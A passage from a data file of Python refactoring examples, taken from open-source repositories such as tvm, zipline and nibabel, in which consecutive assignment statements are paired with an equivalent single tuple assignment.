features['segment_ids'] = create_int_feature(feature.segment_ids)","features['unique_ids'] , features['input_ids'] , features['input_mask'] , features['segment_ids']  = create_int_feature([feature.unique_id]), create_int_feature(feature.input_ids), create_int_feature(feature.input_mask), create_int_feature(feature.segment_ids)"
mesh,https://github.com/tensorflow/mesh/tree/master/mesh_tensorflow/bert/run_squad.py,FeatureWriter,process_feature$1147,"def process_feature(self, feature):
    """"""Write a InputFeature to the TFRecordWriter as a tf.train.Example.""""""
    self.num_features += 1

    def create_int_feature(values):
      feature = tf.train.Feature(
          int64_list=tf.train.Int64List(value=list(values)))
      return feature

    features = collections.OrderedDict()
    features[""unique_ids""] = create_int_feature([feature.unique_id])
    features[""input_ids""] = create_int_feature(feature.input_ids)
    features[""input_mask""] = create_int_feature(feature.input_mask)
    features[""segment_ids""] = create_int_feature(feature.segment_ids)

    if self.is_training:
      features[""start_positions""] = create_int_feature([feature.start_position])
      features[""end_positions""] = create_int_feature([feature.end_position])
      impossible = 0
      if feature.is_impossible:
        impossible = 1
      features[""is_impossible""] = create_int_feature([impossible])

    tf_example = tf.train.Example(features=tf.train.Features(feature=features))
    self._writer.write(tf_example.SerializeToString())","features['start_positions'] = create_int_feature([feature.start_position])
features['end_positions'] = create_int_feature([feature.end_position])
impossible = 0","features['start_positions'] , features['end_positions'] , impossible  = create_int_feature([feature.start_position]), create_int_feature([feature.end_position]), 0"
nimfa,https://github.com/mims-harvard/nimfa/tree/master/nimfa/models/nmf.py,Nmf,sparseness$435,"def sparseness(x):
            eps = np.finfo(x.dtype).eps if 'int' not in str(x.dtype) else 1e-9
            x1 = sqrt(x.shape[0]) - (abs(x).sum() + eps) / \
                (sqrt(multiply(x, x).sum()) + eps)
            x2 = sqrt(x.shape[0]) - 1
            return x1 / x2","x1 = sqrt(x.shape[0]) - (abs(x).sum() + eps) / (sqrt(multiply(x, x).sum()) + eps)
x2 = sqrt(x.shape[0]) - 1","x1 , x2  = sqrt(x.shape[0]) - (abs(x).sum() + eps) / (sqrt(multiply(x, x).sum()) + eps), sqrt(x.shape[0]) - 1"
tvm,https://github.com/apache/tvm/tree/master/tests/python/unittest/test_tir_schedule_compute_at.py,,non_uniform_tiled_conv$882,"def non_uniform_tiled_conv(x: T.Buffer[(1, 3, 100, 100), ""float32""],
                           w: T.Buffer[(16, 3, 3, 3), ""float32""],
                           y: T.Buffer[(1, 16, 98, 98), ""float32""]) -> None:
    x_global = T.alloc_buffer([1, 3, 100, 100], dtype=""float32"")
    for ax0, ax1, ax2, ax3 in T.grid(1, 3, 100, 100):
        with T.block(""cache""):
            v0, v1, v2, v3 = T.axis.remap(""SSSS"", [ax0, ax1, ax2, ax3])
            x_global[v0, v1, v2, v3] = x[v0, v1, v2, v3]
    for h_o, w_o, n, c_o, h_i, w_i, c_i, kh, kw in T.grid(7, 7, 1, 16, 15, 15, 3, 3, 3):
        with T.block(""compute""):
            nn = T.axis.spatial(1, 0)
            cc = T.axis.spatial(16, c_o)
            hh = T.axis.spatial(98, h_o * 15 + h_i)
            ww = T.axis.spatial(98, w_o * 15 + w_i)
            rc, rh, rw = T.axis.remap(""RRR"", [c_i, kh, kw])
            T.where(h_o * 15 + h_i < 98 and w_o * 15 + w_i < 98)
            with T.init():
                y[nn, cc, hh, ww] = T.float32(0)
            y[nn, cc, hh, ww] = y[nn, cc, hh, ww] + \
                x_global[nn, cc // 16 * 3 + rc, hh + rh, ww + rw] * w[cc, rc, rh, rw]","nn = T.axis.spatial(1, 0)
cc = T.axis.spatial(16, c_o)
hh = T.axis.spatial(98, h_o * 15 + h_i)
ww = T.axis.spatial(98, w_o * 15 + w_i)","nn , cc , hh , ww  = T.axis.spatial(1, 0), T.axis.spatial(16, c_o), T.axis.spatial(98, h_o * 15 + h_i), T.axis.spatial(98, w_o * 15 + w_i)"
pylast,https://github.com/pylast/pylast/tree/master/tests/test_network.py,TestPyLastNetwork,test_track_search$373,"def test_track_search(self) -> None:
        # Arrange
        artist = ""Nirvana""
        track = ""Smells Like Teen Spirit""

        # Act
        search = self.network.search_for_track(artist, track)
        results = search.get_next_page()

        # Assert
        assert isinstance(results, list)
        assert isinstance(results[0], pylast.Track)","artist = 'Nirvana'
track = 'Smells Like Teen Spirit'","artist , track  = 'Nirvana', 'Smells Like Teen Spirit'"
arsenal,https://github.com/Orange-Cyberdefense/arsenal/tree/master/arsenal/modules/command.py,Command,get_description_cut_by_size$32,"def get_description_cut_by_size(self, size):
        """"""
        The description cut by lines inside the gui size
        """"""
        desc_lines = self.description.split('\n')
        result = []
        for line in desc_lines:
            result.extend(textwrap.wrap(line, size))
        return result","desc_lines = self.description.split('\n')
result = []","desc_lines , result  = self.description.split('\n'), []"
kedro,https://github.com/quantumblacklabs/kedro/tree/master/tests/extras/datasets/pickle/test_pickle_dataset.py,TestPickleDataSet,test_catalog_release$124,"def test_catalog_release(self, mocker):
        fs_mock = mocker.patch(""fsspec.filesystem"").return_value
        filepath = ""test.pkl""
        data_set = PickleDataSet(filepath=filepath)
        data_set.release()
        fs_mock.invalidate_cache.assert_called_once_with(filepath)","fs_mock = mocker.patch('fsspec.filesystem').return_value
filepath = 'test.pkl'","fs_mock , filepath  = mocker.patch('fsspec.filesystem').return_value, 'test.pkl'"
chainercv,https://github.com/chainer/chainercv/tree/master/chainercv/datasets/cub/cub_utils.py,,get_cub$18,"def get_cub():
    # To support ChainerMN, the target directory should be locked.
    with filelock.FileLock(os.path.join(download.get_dataset_directory(
            'pfnet/chainercv/.lock'), 'cub.lock')):
        data_root = download.get_dataset_directory(root)
        base_path = os.path.join(data_root, 'CUB_200_2011')
        if os.path.exists(base_path):
            # skip downloading
            return base_path

        download_file_path = utils.cached_download(url)
        ext = os.path.splitext(url)[1]
        utils.extractall(download_file_path, data_root, ext)
    return base_path","download_file_path = utils.cached_download(url)
ext = os.path.splitext(url)[1]","download_file_path , ext  = utils.cached_download(url), os.path.splitext(url)[1]"
checkov,https://github.com/bridgecrewio/checkov/tree/master/tests/terraform/graph/variable_rendering/test_string_evaluation.py,TestTerraformEvaluation,test_matchkeys$194,"def test_matchkeys(self):
        input_str = 'matchkeys([""i-123"", ""i-abc"", ""i-def""], [""us-west"", ""us-east"", ""us-east""], [""us-east""])'
        expected = [""i-abc"", ""i-def""]
        actual = evaluate_terraform(input_str)
        for elem in actual:
            if elem not in expected:
                self.fail(f'expected to find {elem} in {expected}. Got {actual}')","expected = ['i-abc', 'i-def']
actual = evaluate_terraform(input_str)","expected , actual  = ['i-abc', 'i-def'], evaluate_terraform(input_str)"
zipline,https://github.com/quantopian/zipline/tree/master/tests/test_finance.py,FinanceTestCase,transaction_sim$163,"def transaction_sim(self, **params):
        """"""This is a utility method that asserts expected
        results for conversion of orders to transactions given a
        trade history
        """"""
        trade_count = params['trade_count']
        trade_interval = params['trade_interval']
        order_count = params['order_count']
        order_amount = params['order_amount']
        order_interval = params['order_interval']
        expected_txn_count = params['expected_txn_count']
        expected_txn_volume = params['expected_txn_volume']

        # optional parameters
        # ---------------------
        # if present, alternate between long and short sales
        alternate = params.get('alternate')

        # if present, expect transaction amounts to match orders exactly.
        complete_fill = params.get('complete_fill')

        asset1 = self.asset_finder.retrieve_asset(1)
        with TempDirectory() as tempdir:

            if trade_interval < timedelta(days=1):
                sim_params = factory.create_simulation_parameters(
                    start=self.start,
                    end=self.end,
                    data_frequency=""minute""
                )

                minutes = self.trading_calendar.minutes_window(
                    sim_params.first_open,
                    int((trade_interval.total_seconds() / 60) * trade_count)
                    + 100)

                price_data = np.array([10.1] * len(minutes))
                assets = {
                    asset1.sid: pd.DataFrame({
                        ""open"": price_data,
                        ""high"": price_data,
                        ""low"": price_data,
                        ""close"": price_data,
                        ""volume"": np.array([100] * len(minutes)),
                        ""dt"": minutes
                    }).set_index(""dt"")
                }

                write_bcolz_minute_data(
                    self.trading_calendar,
                    self.trading_calendar.sessions_in_range(
                        self.trading_calendar.minute_to_session_label(
                            minutes[0]
                        ),
                        self.trading_calendar.minute_to_session_label(
                            minutes[-1]
                        )
                    ),
                    tempdir.path,
                    iteritems(assets),
                )

                equity_minute_reader = BcolzMinuteBarReader(tempdir.path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_minute_reader.first_trading_day,
                    equity_minute_reader=equity_minute_reader,
                )
            else:
                sim_params = factory.create_simulation_parameters(
                    data_frequency=""daily""
                )

                days = sim_params.sessions

                assets = {
                    1: pd.DataFrame({
                        ""open"": [10.1] * len(days),
                        ""high"": [10.1] * len(days),
                        ""low"": [10.1] * len(days),
                        ""close"": [10.1] * len(days),
                        ""volume"": [100] * len(days),
                        ""day"": [day.value for day in days]
                    }, index=days)
                }

                path = os.path.join(tempdir.path, ""testdata.bcolz"")
                BcolzDailyBarWriter(path, self.trading_calendar, days[0],
                                    days[-1]).write(
                    assets.items()
                )

                equity_daily_reader = BcolzDailyBarReader(path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_daily_reader.first_trading_day,
                    equity_daily_reader=equity_daily_reader,
                )

            if ""default_slippage"" not in params or \
               not params[""default_slippage""]:
                slippage_func = FixedBasisPointsSlippage()
            else:
                slippage_func = None

            blotter = SimulationBlotter(slippage_func)

            start_date = sim_params.first_open

            if alternate:
                alternator = -1
            else:
                alternator = 1

            tracker = MetricsTracker(
                trading_calendar=self.trading_calendar,
                first_session=sim_params.start_session,
                last_session=sim_params.end_session,
                capital_base=sim_params.capital_base,
                emission_rate=sim_params.emission_rate,
                data_frequency=sim_params.data_frequency,
                asset_finder=self.asset_finder,
                metrics=load_metrics_set('none'),
            )

            # replicate what tradesim does by going through every minute or day
            # of the simulation and processing open orders each time
            if sim_params.data_frequency == ""minute"":
                ticks = minutes
            else:
                ticks = days

            transactions = []

            order_list = []
            order_date = start_date
            for tick in ticks:
                blotter.current_dt = tick
                if tick >= order_date and len(order_list) < order_count:
                    # place an order
                    direction = alternator ** len(order_list)
                    order_id = blotter.order(
                        asset1,
                        order_amount * direction,
                        MarketOrder(),
                    )
                    order_list.append(blotter.orders[order_id])
                    order_date = order_date + order_interval
                    # move after market orders to just after market next
                    # market open.
                    if order_date.hour >= 21:
                        if order_date.minute >= 00:
                            order_date = order_date + timedelta(days=1)
                            order_date = order_date.replace(hour=14, minute=30)
                else:
                    bar_data = BarData(
                        data_portal=data_portal,
                        simulation_dt_func=lambda: tick,
                        data_frequency=sim_params.data_frequency,
                        trading_calendar=self.trading_calendar,
                        restrictions=NoRestrictions(),
                    )
                    txns, _, closed_orders = blotter.get_transactions(bar_data)
                    for txn in txns:
                        tracker.process_transaction(txn)
                        transactions.append(txn)

                    blotter.prune_orders(closed_orders)

            for i in range(order_count):
                order = order_list[i]
                self.assertEqual(order.asset, asset1)
                self.assertEqual(order.amount, order_amount * alternator ** i)

            if complete_fill:
                self.assertEqual(len(transactions), len(order_list))

            total_volume = 0
            for i in range(len(transactions)):
                txn = transactions[i]
                total_volume += txn.amount
                if complete_fill:
                    order = order_list[i]
                    self.assertEqual(order.amount, txn.amount)

            self.assertEqual(total_volume, expected_txn_volume)

            self.assertEqual(len(transactions), expected_txn_count)

            if total_volume == 0:
                self.assertRaises(KeyError, lambda: tracker.positions[asset1])
            else:
                cumulative_pos = tracker.positions[asset1]
                self.assertEqual(total_volume, cumulative_pos.amount)

            # the open orders should not contain the asset.
            oo = blotter.open_orders
            self.assertNotIn(
                asset1,
                oo,
                ""Entry is removed when no open orders""
            )","trade_count = params['trade_count']
trade_interval = params['trade_interval']
order_count = params['order_count']
order_amount = params['order_amount']
order_interval = params['order_interval']
expected_txn_count = params['expected_txn_count']
expected_txn_volume = params['expected_txn_volume']
alternate = params.get('alternate')
complete_fill = params.get('complete_fill')
asset1 = self.asset_finder.retrieve_asset(1)","trade_count , trade_interval , order_count , order_amount , order_interval , expected_txn_count , expected_txn_volume , alternate , complete_fill , asset1  = params['trade_count'], params['trade_interval'], params['order_count'], params['order_amount'], params['order_interval'], params['expected_txn_count'], params['expected_txn_volume'], params.get('alternate'), params.get('complete_fill'), self.asset_finder.retrieve_asset(1)"
zipline,https://github.com/quantopian/zipline/tree/master/tests/test_finance.py,FinanceTestCase,transaction_sim$163,"def transaction_sim(self, **params):
        """"""This is a utility method that asserts expected
        results for conversion of orders to transactions given a
        trade history
        """"""
        trade_count = params['trade_count']
        trade_interval = params['trade_interval']
        order_count = params['order_count']
        order_amount = params['order_amount']
        order_interval = params['order_interval']
        expected_txn_count = params['expected_txn_count']
        expected_txn_volume = params['expected_txn_volume']

        # optional parameters
        # ---------------------
        # if present, alternate between long and short sales
        alternate = params.get('alternate')

        # if present, expect transaction amounts to match orders exactly.
        complete_fill = params.get('complete_fill')

        asset1 = self.asset_finder.retrieve_asset(1)
        with TempDirectory() as tempdir:

            if trade_interval < timedelta(days=1):
                sim_params = factory.create_simulation_parameters(
                    start=self.start,
                    end=self.end,
                    data_frequency=""minute""
                )

                minutes = self.trading_calendar.minutes_window(
                    sim_params.first_open,
                    int((trade_interval.total_seconds() / 60) * trade_count)
                    + 100)

                price_data = np.array([10.1] * len(minutes))
                assets = {
                    asset1.sid: pd.DataFrame({
                        ""open"": price_data,
                        ""high"": price_data,
                        ""low"": price_data,
                        ""close"": price_data,
                        ""volume"": np.array([100] * len(minutes)),
                        ""dt"": minutes
                    }).set_index(""dt"")
                }

                write_bcolz_minute_data(
                    self.trading_calendar,
                    self.trading_calendar.sessions_in_range(
                        self.trading_calendar.minute_to_session_label(
                            minutes[0]
                        ),
                        self.trading_calendar.minute_to_session_label(
                            minutes[-1]
                        )
                    ),
                    tempdir.path,
                    iteritems(assets),
                )

                equity_minute_reader = BcolzMinuteBarReader(tempdir.path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_minute_reader.first_trading_day,
                    equity_minute_reader=equity_minute_reader,
                )
            else:
                sim_params = factory.create_simulation_parameters(
                    data_frequency=""daily""
                )

                days = sim_params.sessions

                assets = {
                    1: pd.DataFrame({
                        ""open"": [10.1] * len(days),
                        ""high"": [10.1] * len(days),
                        ""low"": [10.1] * len(days),
                        ""close"": [10.1] * len(days),
                        ""volume"": [100] * len(days),
                        ""day"": [day.value for day in days]
                    }, index=days)
                }

                path = os.path.join(tempdir.path, ""testdata.bcolz"")
                BcolzDailyBarWriter(path, self.trading_calendar, days[0],
                                    days[-1]).write(
                    assets.items()
                )

                equity_daily_reader = BcolzDailyBarReader(path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_daily_reader.first_trading_day,
                    equity_daily_reader=equity_daily_reader,
                )

            if ""default_slippage"" not in params or \
               not params[""default_slippage""]:
                slippage_func = FixedBasisPointsSlippage()
            else:
                slippage_func = None

            blotter = SimulationBlotter(slippage_func)

            start_date = sim_params.first_open

            if alternate:
                alternator = -1
            else:
                alternator = 1

            tracker = MetricsTracker(
                trading_calendar=self.trading_calendar,
                first_session=sim_params.start_session,
                last_session=sim_params.end_session,
                capital_base=sim_params.capital_base,
                emission_rate=sim_params.emission_rate,
                data_frequency=sim_params.data_frequency,
                asset_finder=self.asset_finder,
                metrics=load_metrics_set('none'),
            )

            # replicate what tradesim does by going through every minute or day
            # of the simulation and processing open orders each time
            if sim_params.data_frequency == ""minute"":
                ticks = minutes
            else:
                ticks = days

            transactions = []

            order_list = []
            order_date = start_date
            for tick in ticks:
                blotter.current_dt = tick
                if tick >= order_date and len(order_list) < order_count:
                    # place an order
                    direction = alternator ** len(order_list)
                    order_id = blotter.order(
                        asset1,
                        order_amount * direction,
                        MarketOrder(),
                    )
                    order_list.append(blotter.orders[order_id])
                    order_date = order_date + order_interval
                    # move after market orders to just after market next
                    # market open.
                    if order_date.hour >= 21:
                        if order_date.minute >= 00:
                            order_date = order_date + timedelta(days=1)
                            order_date = order_date.replace(hour=14, minute=30)
                else:
                    bar_data = BarData(
                        data_portal=data_portal,
                        simulation_dt_func=lambda: tick,
                        data_frequency=sim_params.data_frequency,
                        trading_calendar=self.trading_calendar,
                        restrictions=NoRestrictions(),
                    )
                    txns, _, closed_orders = blotter.get_transactions(bar_data)
                    for txn in txns:
                        tracker.process_transaction(txn)
                        transactions.append(txn)

                    blotter.prune_orders(closed_orders)

            for i in range(order_count):
                order = order_list[i]
                self.assertEqual(order.asset, asset1)
                self.assertEqual(order.amount, order_amount * alternator ** i)

            if complete_fill:
                self.assertEqual(len(transactions), len(order_list))

            total_volume = 0
            for i in range(len(transactions)):
                txn = transactions[i]
                total_volume += txn.amount
                if complete_fill:
                    order = order_list[i]
                    self.assertEqual(order.amount, txn.amount)

            self.assertEqual(total_volume, expected_txn_volume)

            self.assertEqual(len(transactions), expected_txn_count)

            if total_volume == 0:
                self.assertRaises(KeyError, lambda: tracker.positions[asset1])
            else:
                cumulative_pos = tracker.positions[asset1]
                self.assertEqual(total_volume, cumulative_pos.amount)

            # the open orders should not contain the asset.
            oo = blotter.open_orders
            self.assertNotIn(
                asset1,
                oo,
                ""Entry is removed when no open orders""
            )","blotter = SimulationBlotter(slippage_func)
start_date = sim_params.first_open","blotter , start_date  = SimulationBlotter(slippage_func), sim_params.first_open"
zipline,https://github.com/quantopian/zipline/tree/master/tests/test_finance.py,FinanceTestCase,transaction_sim$163,"def transaction_sim(self, **params):
        """"""This is a utility method that asserts expected
        results for conversion of orders to transactions given a
        trade history
        """"""
        trade_count = params['trade_count']
        trade_interval = params['trade_interval']
        order_count = params['order_count']
        order_amount = params['order_amount']
        order_interval = params['order_interval']
        expected_txn_count = params['expected_txn_count']
        expected_txn_volume = params['expected_txn_volume']

        # optional parameters
        # ---------------------
        # if present, alternate between long and short sales
        alternate = params.get('alternate')

        # if present, expect transaction amounts to match orders exactly.
        complete_fill = params.get('complete_fill')

        asset1 = self.asset_finder.retrieve_asset(1)
        with TempDirectory() as tempdir:

            if trade_interval < timedelta(days=1):
                sim_params = factory.create_simulation_parameters(
                    start=self.start,
                    end=self.end,
                    data_frequency=""minute""
                )

                minutes = self.trading_calendar.minutes_window(
                    sim_params.first_open,
                    int((trade_interval.total_seconds() / 60) * trade_count)
                    + 100)

                price_data = np.array([10.1] * len(minutes))
                assets = {
                    asset1.sid: pd.DataFrame({
                        ""open"": price_data,
                        ""high"": price_data,
                        ""low"": price_data,
                        ""close"": price_data,
                        ""volume"": np.array([100] * len(minutes)),
                        ""dt"": minutes
                    }).set_index(""dt"")
                }

                write_bcolz_minute_data(
                    self.trading_calendar,
                    self.trading_calendar.sessions_in_range(
                        self.trading_calendar.minute_to_session_label(
                            minutes[0]
                        ),
                        self.trading_calendar.minute_to_session_label(
                            minutes[-1]
                        )
                    ),
                    tempdir.path,
                    iteritems(assets),
                )

                equity_minute_reader = BcolzMinuteBarReader(tempdir.path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_minute_reader.first_trading_day,
                    equity_minute_reader=equity_minute_reader,
                )
            else:
                sim_params = factory.create_simulation_parameters(
                    data_frequency=""daily""
                )

                days = sim_params.sessions

                assets = {
                    1: pd.DataFrame({
                        ""open"": [10.1] * len(days),
                        ""high"": [10.1] * len(days),
                        ""low"": [10.1] * len(days),
                        ""close"": [10.1] * len(days),
                        ""volume"": [100] * len(days),
                        ""day"": [day.value for day in days]
                    }, index=days)
                }

                path = os.path.join(tempdir.path, ""testdata.bcolz"")
                BcolzDailyBarWriter(path, self.trading_calendar, days[0],
                                    days[-1]).write(
                    assets.items()
                )

                equity_daily_reader = BcolzDailyBarReader(path)

                data_portal = DataPortal(
                    self.asset_finder, self.trading_calendar,
                    first_trading_day=equity_daily_reader.first_trading_day,
                    equity_daily_reader=equity_daily_reader,
                )

            if ""default_slippage"" not in params or \
               not params[""default_slippage""]:
                slippage_func = FixedBasisPointsSlippage()
            else:
                slippage_func = None

            blotter = SimulationBlotter(slippage_func)

            start_date = sim_params.first_open

            if alternate:
                alternator = -1
            else:
                alternator = 1

            tracker = MetricsTracker(
                trading_calendar=self.trading_calendar,
                first_session=sim_params.start_session,
                last_session=sim_params.end_session,
                capital_base=sim_params.capital_base,
                emission_rate=sim_params.emission_rate,
                data_frequency=sim_params.data_frequency,
                asset_finder=self.asset_finder,
                metrics=load_metrics_set('none'),
            )

            # replicate what tradesim does by going through every minute or day
            # of the simulation and processing open orders each time
            if sim_params.data_frequency == ""minute"":
                ticks = minutes
            else:
                ticks = days

            transactions = []

            order_list = []
            order_date = start_date
            for tick in ticks:
                blotter.current_dt = tick
                if tick >= order_date and len(order_list) < order_count:
                    # place an order
                    direction = alternator ** len(order_list)
                    order_id = blotter.order(
                        asset1,
                        order_amount * direction,
                        MarketOrder(),
                    )
                    order_list.append(blotter.orders[order_id])
                    order_date = order_date + order_interval
                    # move after market orders to just after market next
                    # market open.
                    if order_date.hour >= 21:
                        if order_date.minute >= 00:
                            order_date = order_date + timedelta(days=1)
                            order_date = order_date.replace(hour=14, minute=30)
                else:
                    bar_data = BarData(
                        data_portal=data_portal,
                        simulation_dt_func=lambda: tick,
                        data_frequency=sim_params.data_frequency,
                        trading_calendar=self.trading_calendar,
                        restrictions=NoRestrictions(),
                    )
                    txns, _, closed_orders = blotter.get_transactions(bar_data)
                    for txn in txns:
                        tracker.process_transaction(txn)
                        transactions.append(txn)

                    blotter.prune_orders(closed_orders)

            for i in range(order_count):
                order = order_list[i]
                self.assertEqual(order.asset, asset1)
                self.assertEqual(order.amount, order_amount * alternator ** i)

            if complete_fill:
                self.assertEqual(len(transactions), len(order_list))

            total_volume = 0
            for i in range(len(transactions)):
                txn = transactions[i]
                total_volume += txn.amount
                if complete_fill:
                    order = order_list[i]
                    self.assertEqual(order.amount, txn.amount)

            self.assertEqual(total_volume, expected_txn_volume)

            self.assertEqual(len(transactions), expected_txn_count)

            if total_volume == 0:
                self.assertRaises(KeyError, lambda: tracker.positions[asset1])
            else:
                cumulative_pos = tracker.positions[asset1]
                self.assertEqual(total_volume, cumulative_pos.amount)

            # the open orders should not contain the asset.
            oo = blotter.open_orders
            self.assertNotIn(
                asset1,
                oo,
                ""Entry is removed when no open orders""
            )","transactions = []
order_list = []
order_date = start_date","transactions , order_list , order_date  = [], [], start_date"
i3ipc-python,https://github.com/altdesktop/i3ipc-python/tree/master//run-tests.py,,run_pytest$71,"def run_pytest(display):
    version_info = sys.version_info

    if version_info[0] < 3:
        raise NotImplementedError('tests are not implemented for python < 3')

    cmd = ['python3', '-m', 'pytest', '-s']

    if version_info[1] < 6:
        cmd += ['--ignore', 'test/aio']

    env = os.environ.copy()
    env['DISPLAY'] = ':%d' % display
    env['PYTHONPATH'] = here
    env['I3SOCK'] = '/tmp/i3ipc-test-sock-{display}'.format(display=display)
    return subprocess.run(cmd + sys.argv[1:], env=env)","env['DISPLAY'] = ':%d' % display
env['PYTHONPATH'] = here
env['I3SOCK'] = '/tmp/i3ipc-test-sock-{display}'.format(display=display)","env['DISPLAY'] , env['PYTHONPATH'] , env['I3SOCK']  = ':%d' % display, here, '/tmp/i3ipc-test-sock-{display}'.format(display=display)"
bench,https://github.com/frappe/bench/tree/master/bench/release.py,,commit_changes$239,"def commit_changes(repo_path, new_version, to_branch):
	print('committing version change to', repo_path)

	repo = git.Repo(repo_path)
	app_name = os.path.basename(repo_path)

	if to_branch.lower() in releasable_branches:
		repo.index.add([os.path.join(app_name, '__init__.py')])
	else:
		repo.index.add([os.path.join(app_name, 'hooks.py')])

	repo.index.commit(f'bumped to version {new_version}')","repo = git.Repo(repo_path)
app_name = os.path.basename(repo_path)","repo , app_name  = git.Repo(repo_path), os.path.basename(repo_path)"
elastalert,https://github.com/Yelp/elastalert/tree/master/tests/util_test.py,,test_should_scrolling_continue$219,"def test_should_scrolling_continue():
    rule_no_max_scrolling = {'max_scrolling_count': 0, 'scrolling_cycle': 1}
    rule_reached_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 2}
    rule_before_first_run = {'max_scrolling_count': 0, 'scrolling_cycle': 0}
    rule_before_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 1}
    rule_over_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 3}

    assert should_scrolling_continue(rule_no_max_scrolling) is True
    assert should_scrolling_continue(rule_reached_max_scrolling) is False
    assert should_scrolling_continue(rule_before_first_run) is True
    assert should_scrolling_continue(rule_before_max_scrolling) is True
    assert should_scrolling_continue(rule_over_max_scrolling) is False","rule_no_max_scrolling = {'max_scrolling_count': 0, 'scrolling_cycle': 1}
rule_reached_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 2}
rule_before_first_run = {'max_scrolling_count': 0, 'scrolling_cycle': 0}
rule_before_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 1}
rule_over_max_scrolling = {'max_scrolling_count': 2, 'scrolling_cycle': 3}","rule_no_max_scrolling , rule_reached_max_scrolling , rule_before_first_run , rule_before_max_scrolling , rule_over_max_scrolling  = {'max_scrolling_count': 0, 'scrolling_cycle': 1}, {'max_scrolling_count': 2, 'scrolling_cycle': 2}, {'max_scrolling_count': 0, 'scrolling_cycle': 0}, {'max_scrolling_count': 2, 'scrolling_cycle': 1}, {'max_scrolling_count': 2, 'scrolling_cycle': 3}"
opentelemetry-python,https://github.com/open-telemetry/opentelemetry-python/tree/master/exporter/opentelemetry-exporter-jaeger-thrift/src/opentelemetry/exporter/jaeger/thrift/gen/jaeger/ttypes.py,Batch,__init__$699,"def __init__(self, process=None, spans=None,):
        self.process = process
        self.spans = spans","self.process = process
self.spans = spans","self.process , self.spans  = process, spans"
nibabel,https://github.com/nipy/nibabel/tree/master/nibabel/tests/test_round_trip.py,,check_arr$123,"def check_arr(test_id, V_in, in_type, out_type, scaling_type):
    arr, arr_dash, slope, inter = check_params(V_in, in_type, out_type)
    if arr_dash is None:
        # Scaling causes a header or writer error
        return
    nzs = arr != 0  # avoid divide by zero error
    if not np.any(nzs):
        if DEBUG:
            raise ValueError('Array all zero')
        return
    arr = arr[nzs]
    arr_dash_L = arr_dash.astype(BIG_FLOAT)[nzs]
    top = arr - arr_dash_L
    if not np.any(top != 0):
        return
    rel_err = np.abs(top / arr)
    abs_err = np.abs(top)
    if slope == 1:  # integers output, offset only scaling
        if {in_type, out_type} == {np.int64, np.uint64}:
            # Scaling to or from 64 bit ints can go outside range of continuous
            # integers for float64 and thus lose precision; take this into
            # account
            A = arr.astype(float)
            Ai = A - inter
            ulps = [big_bad_ulp(A), big_bad_ulp(Ai)]
            exp_abs_err = np.max(ulps, axis=0)
        else:  # floats can give full precision - no error!
            exp_abs_err = np.zeros_like(abs_err)
        rel_thresh = 0
    else:
        # Error from integer rounding
        inting_err = np.abs(scaling_type(slope) / 2)
        inting_err = inting_err + ulp(inting_err)
        # Error from calculation of inter
        inter_err = ulp(scaling_type(inter))
        # Max abs error from floating point
        with np.errstate(over='ignore'):
            Ai = arr - scaling_type(inter)
        Ais = Ai / scaling_type(slope)
        exp_abs_err = inting_err + inter_err + (
            big_bad_ulp(Ai) + big_bad_ulp(Ais))
        # Relative scaling error from calculation of slope
        # This threshold needs to be 2 x larger on windows 32 bit and PPC for
        # some reason
        rel_thresh = ulp(scaling_type(1))
    test_vals = (abs_err <= exp_abs_err) | (rel_err <= rel_thresh)
    this_test = np.all(test_vals)
    if DEBUG:
        abs_fails = (abs_err > exp_abs_err)
        rel_fails = (rel_err > rel_thresh)
        all_fails = abs_fails & rel_fails
        if np.any(rel_fails):
            abs_mx_e = abs_err[rel_fails].max()
            exp_abs_mx_e = exp_abs_err[rel_fails].max()
        else:
            abs_mx_e = None
            exp_abs_mx_e = None
        if np.any(abs_fails):
            rel_mx_e = rel_err[abs_fails].max()
        else:
            rel_mx_e = None
        print((test_id,
               np.dtype(in_type).str,
               np.dtype(out_type).str,
               exp_abs_mx_e,
               abs_mx_e,
               rel_thresh,
               rel_mx_e,
               slope, inter))
        # To help debugging failures with --pdb-failure
        np.nonzero(all_fails)
    assert this_test","arr = arr[nzs]
arr_dash_L = arr_dash.astype(BIG_FLOAT)[nzs]","arr , arr_dash_L  = arr[nzs], arr_dash.astype(BIG_FLOAT)[nzs]"
nibabel,https://github.com/nipy/nibabel/tree/master/nibabel/tests/test_round_trip.py,,check_arr$123,"def check_arr(test_id, V_in, in_type, out_type, scaling_type):
    arr, arr_dash, slope, inter = check_params(V_in, in_type, out_type)
    if arr_dash is None:
        # Scaling causes a header or writer error
        return
    nzs = arr != 0  # avoid divide by zero error
    if not np.any(nzs):
        if DEBUG:
            raise ValueError('Array all zero')
        return
    arr = arr[nzs]
    arr_dash_L = arr_dash.astype(BIG_FLOAT)[nzs]
    top = arr - arr_dash_L
    if not np.any(top != 0):
        return
    rel_err = np.abs(top / arr)
    abs_err = np.abs(top)
    if slope == 1:  # integers output, offset only scaling
        if {in_type, out_type} == {np.int64, np.uint64}:
            # Scaling to or from 64 bit ints can go outside range of continuous
            # integers for float64 and thus lose precision; take this into
            # account
            A = arr.astype(float)
            Ai = A - inter
            ulps = [big_bad_ulp(A), big_bad_ulp(Ai)]
            exp_abs_err = np.max(ulps, axis=0)
        else:  # floats can give full precision - no error!
            exp_abs_err = np.zeros_like(abs_err)
        rel_thresh = 0
    else:
        # Error from integer rounding
        inting_err = np.abs(scaling_type(slope) / 2)
        inting_err = inting_err + ulp(inting_err)
        # Error from calculation of inter
        inter_err = ulp(scaling_type(inter))
        # Max abs error from floating point
        with np.errstate(over='ignore'):
            Ai = arr - scaling_type(inter)
        Ais = Ai / scaling_type(slope)
        exp_abs_err = inting_err + inter_err + (
            big_bad_ulp(Ai) + big_bad_ulp(Ais))
        # Relative scaling error from calculation of slope
        # This threshold needs to be 2 x larger on windows 32 bit and PPC for
        # some reason
